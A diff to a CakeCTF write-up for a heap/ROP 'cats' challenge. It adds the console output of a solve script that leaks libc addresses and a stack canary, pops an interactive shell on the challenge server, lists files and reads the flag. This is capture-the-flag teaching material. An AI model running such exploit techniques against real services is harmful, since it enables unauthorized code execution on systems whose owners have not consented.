@@ -255,3 +255,40 @@ rop += p64(system_addr)
 ```
 
 See [solve-cats.py](solve-cats.py)
+
+```
+$ python3 solve.py 
+[+] Opening connection to pwn.cakectf.com on port 9004: Done
+b'Name: \xd0\xc4\x8a\x99\xba\x7f'
+0x7fba998ac4d0
+0x7fba994a5f68
+b'Name: '
+0x0
+b'Name: }\xd4\x16\xa2\x01\xde\xcaEIr8\x911\xf5C'
+0x45cade01a216d47d
+b'Name: \xd4\x16\xa2\x01\xde\xcaEIr8\x911\xf5C'
+0x4945cade01a216d4
+b'Name: \x16\xa2\x01\xde\xcaEIr8\x911\xf5C'
+0x724945cade01a216
+b'Name: \xa2\x01\xde\xcaEIr8\x911\xf5C'
+0x38724945cade01a2
+b'Name: \x01\xde\xcaEIr8\x911\xf5C'
+0x9138724945cade01
+b'Name: \xde\xcaEIr8\x911\xf5C'
+0x319138724945cade
+b'Name: \xcaEIr8\x911\xf5C'
+0xf5319138724945ca
+0xcade01a216d47d00
+0x7fba997c85aa
+[*] Switching to interactive mode
+ Species [0=Bengal Cat / 1=Ocicat / 2=Ocelot / 3=Savannah Cat]: Age: Name: 1. New cat
+2. Get cat
+3. Set cat
+>> $ 5
+Bye-nya!
+$ ls
+chall
+flag-dac44a866fadca64f0f3c030eafa5aca.txt
+$ cat flag-dac44a866fadca64f0f3c030eafa5aca.txt
+CakeCTF{c4n_U_d15t1ngu15h_b3tw33n_th353_c4t_5p3c13s?}
+```
